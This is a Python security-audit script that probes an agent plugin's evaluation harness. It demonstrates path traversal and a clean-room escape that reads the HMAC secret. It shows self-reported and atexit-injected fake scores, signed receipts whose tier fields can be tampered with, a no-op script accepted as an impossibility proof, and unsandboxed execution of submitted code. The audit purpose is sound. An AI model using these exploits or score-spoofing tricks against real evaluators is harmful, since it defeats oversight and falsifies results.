"""Adversarial probe: path jail, clean-room escape, score spoofing, HMAC coverage,
BarrierProof semantics, primitive admission execution.

Two kinds of evidence are produced:
  * over MCP JSON-RPC (the path the DSH bridge actually uses);
  * by importing lib/ directly (isolated unit-level proofs, still read-only for the plugin:
    python is started with -B so no __pycache__ is ever written into plugins/greatwall-agent/).

Run:  python -B plugins/dsh-greatwall-agent/docs/audit/probe_security.py
"""

from __future__ import annotations

import hashlib
import hmac
import json
import os
import shutil
import sys
import tempfile
import traceback
from pathlib import Path
from typing import Any, Dict, List

AUDIT_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = AUDIT_DIR.parents[2]
PLUGIN_ROOT = PLUGINS_DIR / "greatwall-agent"
sys.path.insert(0, str(AUDIT_DIR))
sys.path.insert(0, str(PLUGIN_ROOT))

from mcp_client import MCPProc, is_error_result, tool_result_payload  # noqa: E402

for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
    except Exception:
        pass

RESULTS: List[Dict[str, Any]] = []


def record(cid: str, title: str, ok: bool, evidence: Any) -> None:
    RESULTS.append({"id": cid, "title": title, "confirmed": bool(ok), "evidence": evidence})
    print(f"[{'CONFIRMED' if ok else 'not-reproduced'}] {cid} {title}\n    {json.dumps(evidence, ensure_ascii=False, default=str)[:1600]}\n")


# =====================================================================
# A. gw_archive_query -> query_l2_item path traversal (MCP level)
# =====================================================================
def probe_archive_traversal() -> None:
    tmp = Path(tempfile.mkdtemp(prefix="gw_audit_trav_"))
    ws = tmp / "ws"
    (ws / "shared_readonly" / "datasets_public").mkdir(parents=True, exist_ok=True)
    p = MCPProc()
    try:
        p.initialize()
        r = p.call_tool("gw_archive_query", {"workspaceRoot": str(ws), "action": "get_l0_index"}, req_id=1)
        # files outside shared_readonly/archive/ledger/primitives
        (ws / "outside_workspace_secret.py").write_text(
            "TOPSECRET_FROM_WORKSPACE_ROOT = 'leaked'\n", encoding="utf-8"
        )
        (tmp / "outside_tmp_secret.py").write_text("TOPSECRET_FROM_TMP_ROOT = 'leaked'\n", encoding="utf-8")

        r1 = p.call_tool(
            "gw_archive_query",
            {"workspaceRoot": str(ws), "action": "get_l2_item", "itemId": "../../../../outside_workspace_secret"},
            req_id=2,
        )
        p1 = tool_result_payload(r1)
        r2 = p.call_tool(
            "gw_archive_query",
            {"workspaceRoot": str(ws), "action": "get_l2_item", "itemId": str(tmp / "outside_tmp_secret")},
            req_id=3,
        )
        p2 = tool_result_payload(r2)
        record(
            "A1",
            "query_l2_item 路径穿越（相对 ../../../../ 与绝对路径）读取隔离区外任意 .py",
            "TOPSECRET_FROM_WORKSPACE_ROOT" in str(p1.get("content", "")) and "TOPSECRET_FROM_TMP_ROOT" in str(p2.get("content", "")),
            {
                "request_itemId_1": "../../../../outside_workspace_secret",
                "response_1": {k: v for k, v in p1.items() if k != "content"},
                "content_1_contains_secret": "TOPSECRET_FROM_WORKSPACE_ROOT" in str(p1.get("content", "")),
                "request_itemId_2": str(tmp / "outside_tmp_secret"),
                "response_2": {k: v for k, v in p2.items() if k != "content"},
                "content_2_contains_secret": "TOPSECRET_FROM_TMP_ROOT" in str(p2.get("content", "")),
                "tmp_root": str(tmp),
            },
        )
    finally:
        p.close()
        shutil.rmtree(tmp, ignore_errors=True)


# =====================================================================
# B. Evaluated candidate escapes the clean room / reads the HMAC secret
# =====================================================================
def probe_clean_room_escape() -> Dict[str, Any]:
    tmp = Path(tempfile.mkdtemp(prefix="gw_audit_escape_"))
    ws = tmp / "ws"
    (ws / "shared_readonly" / "datasets_public").mkdir(parents=True, exist_ok=True)
    cand = (
        "import pathlib\n"
        "def solve(inputs):\n"
        "    ws = pathlib.Path.cwd().parent.parent\n"
        "    secret = (ws / '.kernel_vault' / 'hmac_secret.key').read_text(encoding='utf-8').strip()\n"
        "    (ws / 'pwned_outside_island.txt').write_text('secret=' + secret, encoding='utf-8')\n"
        "    return float(sum(inputs))\n"
    )
    p = MCPProc()
    out: Dict[str, Any] = {}
    try:
        p.initialize()
        p.call_tool("gw_init_campaign", {"workspaceRoot": str(ws), "taskId": "ESCAPE", "taskDescription": "clean-room escape probe"}, req_id=1)
        r = p.call_tool("gw_lock_distillation", {
            "workspaceRoot": str(ws),
            "orthogonalFamilies": [{"family_id": "FAM-01", "family_name": "Fam"}],
            "candidateBaselines": [{"name": "CAND_ESCAPE", "code": cand}],
        }, req_id=2)
        payload = tool_result_payload(r)
        pwned = ws / "pwned_outside_island.txt"
        secret_file = ws / ".kernel_vault" / "hmac_secret.key"
        out = {
            "status": payload.get("status"),
            "anchor_s0_score": payload.get("anchor_s0_score"),
            "pwned_file_created_outside_island": pwned.exists(),
            "pwned_file_path": str(pwned),
            "pwned_content_matches_vault_secret": pwned.exists() and secret_file.exists()
            and pwned.read_text(encoding="utf-8").strip() == "secret=" + secret_file.read_text(encoding="utf-8").strip(),
            "workspace": str(ws),
        }
        record("B1", "被评测候选代码可写出孤岛并读取 .kernel_vault/hmac_secret.key（清洁室无 OS 级隔离）", out["pwned_file_created_outside_island"] and out["pwned_content_matches_vault_secret"], out)
    finally:
        p.close()
    return out


# =====================================================================
# C. Signed receipt certifies candidate self-reported numbers
# =====================================================================
def probe_score_spoof() -> None:
    tmp = Path(tempfile.mkdtemp(prefix="gw_audit_spoof_"))
    ws = tmp / "ws"
    (ws / "shared_readonly" / "datasets_public").mkdir(parents=True, exist_ok=True)
    cand_eval = (
        "def evaluate():\n"
        "    return {'frozen_score': 1e9, 'live_score': 1e9, 'niche_hard_cases_score': 1e9, 'case_scores': {'c1': 1e9}}\n"
    )
    p = MCPProc()
    try:
        p.initialize()
        p.call_tool("gw_init_campaign", {"workspaceRoot": str(ws), "taskId": "SPOOF", "taskDescription": "score spoof probe"}, req_id=1)
        r = p.call_tool("gw_lock_distillation", {
            "workspaceRoot": str(ws),
            "orthogonalFamilies": [{"family_id": "FAM-01", "family_name": "Fam"}],
            "candidateBaselines": [{"name": "CAND_SELFREPORT", "code": cand_eval}],
        }, req_id=2)
        payload = tool_result_payload(r)
        receipt = payload.get("s0_evaluation", {})
        record(
            "C1",
            "被测代码 evaluate() 自报分数获得合法 HMAC 签名收据（防吹牛防线可自证）",
            payload.get("anchor_s0_score") == 1e9 and receipt.get("triage_tier") == "PARETO_PROMOTE" and bool(receipt.get("hmac_sha256_signature")),
            {
                "anchor_s0_score": payload.get("anchor_s0_score"),
                "triage_tier": receipt.get("triage_tier"),
                "signature": str(receipt.get("hmac_sha256_signature"))[:32] + "...",
                "scores": receipt.get("scores"),
                "workspace": str(ws),
            },
        )
    finally:
        p.close()
        shutil.rmtree(tmp, ignore_errors=True)

    # C2: last-line stdout override via atexit
    tmp2 = Path(tempfile.mkdtemp(prefix="gw_audit_spoof2_"))
    ws2 = tmp2 / "ws"
    (ws2 / "shared_readonly" / "datasets_public").mkdir(parents=True, exist_ok=True)
    cand_atexit = (
        "import atexit, json\n"
        "def _spoof():\n"
        "    print('__GW_METRICS_JSON__:' + json.dumps({'frozen_score': 777.0, 'live_score': 777.0, 'niche_hard_cases_score': 777.0, 'isomorphic_perturbation_gap': 0.0, 'case_scores': {}}))\n"
        "atexit.register(_spoof)\n"
        "def solve(inputs):\n"
        "    return 1.0\n"
    )
    p = MCPProc()
    try:
        p.initialize()
        p.call_tool("gw_init_campaign", {"workspaceRoot": str(ws2), "taskId": "SPOOF2", "taskDescription": "stdout spoof probe"}, req_id=1)
        r = p.call_tool("gw_lock_distillation", {
            "workspaceRoot": str(ws2),
            "orthogonalFamilies": [{"family_id": "FAM-01", "family_name": "Fam"}],
            "candidateBaselines": [{"name": "CAND_ATEXIT", "code": cand_atexit}],
        }, req_id=2)
        payload = tool_result_payload(r)
        receipt = payload.get("s0_evaluation", {})
        record(
            "C2",
            "被评测代码用 atexit 在指标行之后补打伪造 __GW_METRICS_JSON__ 覆盖真实得分",
            payload.get("anchor_s0_score") == 777.0,
            {
                "true_solve_return": 1.0,
                "anchor_s0_score": payload.get("anchor_s0_score"),
                "scores": receipt.get("scores"),
                "workspace": str(ws2),
            },
        )
    finally:
        p.close()
        shutil.rmtree(tmp2, ignore_errors=True)


# =====================================================================
# D. HMAC signature does not cover triage_tier / case_scores
# =====================================================================
def probe_hmac_coverage(workspace: Path) -> None:
    from lib.engine import GreatWallEngine  # noqa: WPS433

    history = workspace / ".kernel_vault" / "evaluator_suite" / "receipts_history.jsonl"
    if not history.exists():
        record("D1", "HMAC 收据字段覆盖范围", False, {"error": f"missing receipt history {history}"})
        return
    lines = [ln for ln in history.read_text(encoding="utf-8").splitlines() if ln.strip()]
    receipt = json.loads(lines[-1])
    engine = GreatWallEngine(workspace)
    before = engine.evaluator.verify_receipt_signature(receipt)
    tampered = json.loads(json.dumps(receipt))
    tampered["triage_tier"] = "PARETO_PROMOTE"
    tampered["scores"]["isomorphic_perturbation_gap"] = 0.0
    tampered["scores"]["niche_hard_cases_score"] = 999999.0
    tampered["case_scores"] = {"fake": 123.0}
    after = engine.evaluator.verify_receipt_signature(tampered)
    record(
        "D1",
        "HMAC 只签 (node_id, commit_hash, run_nonce, frozen, live)：triage_tier / case_scores / niche 可任意篡改不被发现",
        before is True and after is True,
        {
            "receipt_source": str(history),
            "receipt_node": receipt.get("node_id"),
            "original_verifies": before,
            "tampered_still_verifies": after,
            "tampered_fields": ["triage_tier", "case_scores", "niche_hard_cases_score", "isomorphic_perturbation_gap"],
            "original_triage": receipt.get("triage_tier"),
            "tampered_triage": tampered.get("triage_tier"),
        },
    )


# =====================================================================
# E. BarrierProof: no-op script certifies "impossibility"; script may live outside the island
# =====================================================================
def probe_barrier() -> None:
    from lib.engine import GreatWallEngine  # noqa: WPS433
    from lib.archive import LightweightArchive  # noqa: WPS433

    tmp = Path(tempfile.mkdtemp(prefix="gw_audit_barrier_"))
    ws = tmp / "ws"
    (ws / "shared_readonly" / "datasets_public").mkdir(parents=True, exist_ok=True)
    try:
        engine = GreatWallEngine(ws)
        engine.init_campaign(task_id="BARRIER", task_description="barrier probe")
        engine.lock_opening_distillation(
            orthogonal_families=[
                {"family_id": "FAM-01", "family_name": "Fam1"},
                {"family_id": "FAM-02", "family_name": "Fam2"},
            ],
            candidate_baselines=[{"name": "C", "code": "def solve(inputs):\n    return float(sum(inputs))\n"}],
        )
        alloc = engine.allocate_exploration_slot("FAM-01", "solve", "h", step_budget=10)
        slot = alloc["slot_id"]
        island = Path(alloc["island_path"])
        receipt = engine.evaluate_slot(slot, timeout_sec=30)
        legacy = island / "legacy_out"
        legacy.mkdir(parents=True, exist_ok=True)
        (legacy / "epitaph.md").write_text("本节点在门控探针中已完成基线复现，未发现额外提分空间。\n", encoding="utf-8")
        (legacy / "last_will_proposals.json").write_text(json.dumps([
            {"action_type": "ORTHOGONAL", "falsifiable_hypothesis": "换族可突破"}
        ], ensure_ascii=False), encoding="utf-8")
        # A no-op "counterexample script": it proves nothing, yet exit code 0 == verified.
        (island / "proof_noop.py").write_text("print('nothing is proven here')\n", encoding="utf-8")
        (legacy / "barrier_proof.json").write_text(json.dumps({
            "proof_id": "BARRIER-AUDIT-1",
            "impossibility_statement": "该正交方法族理论上完全不可解",
            "counterexample_script": "proof_noop.py",
            "blocked_family_id": "FAM-02",
        }, ensure_ascii=False), encoding="utf-8")
        sub = engine.submit_legacy_and_release_slot(slot, steps_consumed=10)
        alloc2 = engine.allocate_exploration_slot("FAM-02", "solve", "h2", step_budget=10)
        record(
            "E1",
            "任意一个 exit=0 的空脚本即可认证 BarrierProof 并永久封禁整个方法族（FAM-02 无法再分配算力）",
            sub.get("status") == "OK" and alloc2.get("status") == "BLOCKED_BY_BARRIER_PROOF",
            {
                "submit_status": sub.get("status"),
                "admitted_barrier_proofs": sub.get("admitted_barrier_proofs"),
                "proof_script": "print('nothing is proven here')",
                "second_allocate_status": alloc2.get("status"),
                "second_allocate_message": alloc2.get("message"),
            },
        )
        # E2: counterexample_script may point outside the island (path traversal -> engine executes it)
        arch = engine.archive
        island2 = tmp / "island2"
        island2.mkdir(parents=True, exist_ok=True)
        escape_script = tmp / "escaped_barrier.py"
        marker = tmp / "BARRIER_ESCAPE_EXECUTED.txt"
        escape_script.write_text(
            f"open(r'{marker}', 'w', encoding='utf-8').write('executed outside island')\nprint('ok')\n",
            encoding="utf-8",
        )
        bjson = island2 / "barrier2.json"
        bjson.write_text(json.dumps({
            "impossibility_statement": "x",
            "counterexample_script": "../escaped_barrier.py",
            "blocked_family_id": "FAM-09",
        }, ensure_ascii=False), encoding="utf-8")
        ok, msg, entry = arch._verify_barrier_proof(bjson, island2, "NODE-X", "FAM-09")
        record(
            "E2",
            "_verify_barrier_proof 不校验 counterexample_script 是否在孤岛内：可执行任意路径 .py 并认证",
            ok is True and marker.exists(),
            {
                "verify_result": ok,
                "message": msg,
                "script_rel": "../escaped_barrier.py",
                "island": str(island2),
                "resolved_outside_island_marker": str(marker),
                "marker_created": marker.exists(),
                "proof_entry": entry,
            },
        )
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


# =====================================================================
# F. Primitive admission executes arbitrary code (docstring claims AST audit)
# =====================================================================
def probe_primitive_admission() -> None:
    from lib.archive import LightweightArchive  # noqa: WPS433

    tmp = Path(tempfile.mkdtemp(prefix="gw_audit_prim_"))
    shared = tmp / "shared_readonly"
    island = tmp / "worktrees" / "slot_99_node-99"
    (island / "legacy_out" / "primitives").mkdir(parents=True, exist_ok=True)
    try:
        arch = LightweightArchive(shared)
        evil = island / "legacy_out" / "primitives" / "evil.py"
        marker = island / "PRIMITIVE_EXECUTED_UNSANDBOXED.txt"
        evil.write_text(
            '"""evil primitive"""\n'
            "import os, pathlib\n"
            "def helper(x):\n"
            '    """docstring"""\n'
            "    return x + 1\n"
            "def test_helper():\n"
            f"    pathlib.Path(r'{marker}').write_text('executed', encoding='utf-8')\n"
            "    assert helper(1) == 2\n",
            encoding="utf-8",
        )
        ok, msg = arch._audit_and_test_primitive(evil, island)
        record(
            "F1",
            "_audit_and_test_primitive 声称 AST 审计，实际直接 exec 节点代码且无任何禁止导入/调用拦截",
            ok is True and marker.exists(),
            {
                "admitted": ok,
                "message": msg,
                "imports_used": ["os", "pathlib"],
                "system_tool_import_forbidden": False,
                "marker_created": marker.exists(),
                "marker": str(marker),
            },
        )
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


# =====================================================================
# G. compile_final_delivery accepts an empty executive summary (anti-bluff gate bypass)
# =====================================================================
def probe_empty_summary() -> None:
    from lib.engine import GreatWallEngine  # noqa: WPS433

    tmp = Path(tempfile.mkdtemp(prefix="gw_audit_empty_"))
    ws = tmp / "ws"
    (ws / "shared_readonly" / "datasets_public").mkdir(parents=True, exist_ok=True)
    try:
        engine = GreatWallEngine(ws)
        engine.init_campaign(task_id="EMPTY", task_description="empty summary probe")
        res = engine.compile_final_delivery("")
        report = (ws / "final_delivery" / "01_executive_report.md")
        record(
            "G1",
            "compile_final_delivery 允许 executiveSummaryMd 为空串：终局报告正文可为空仍判定 OK",
            res.get("status") == "OK",
            {
                "status": res.get("status"),
                "report_path": str(report),
                "report_bytes": report.stat().st_size if report.exists() else None,
                "report_body_after_header": report.read_text(encoding="utf-8")[:200] if report.exists() else "",
            },
        )
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def main() -> int:
    print(f"plugin root = {PLUGIN_ROOT}\npython      = {sys.executable} {sys.version.split()[0]}\n")
    probe_archive_traversal()

    campaign_ws = None
    campaign_json = AUDIT_DIR / "campaign_result.json"
    if campaign_json.exists():
        cj = json.loads(campaign_json.read_text(encoding="utf-8"))
        campaign_ws = Path(cj["workspace"])
    probe_hmac_coverage(campaign_ws or Path("__missing__"))

    for fn in (probe_clean_room_escape, probe_score_spoof, probe_barrier, probe_primitive_admission, probe_empty_summary):
        print(f"--- {fn.__name__} ---")
        try:
            fn()
        except Exception:  # noqa: BLE001
            record(fn.__name__, "probe aborted", False, {"traceback": traceback.format_exc()})

    out = {
        "plugin_root": str(PLUGIN_ROOT),
        "python": sys.version,
        "confirmed": [r for r in RESULTS if r["confirmed"]],
        "results": RESULTS,
    }
    (AUDIT_DIR / "security_result.json").write_text(json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"\n=== {len(out['confirmed'])}/{len(RESULTS)} findings confirmed -> security_result.json ===")
    return 0


if __name__ == "__main__":
    sys.exit(main())
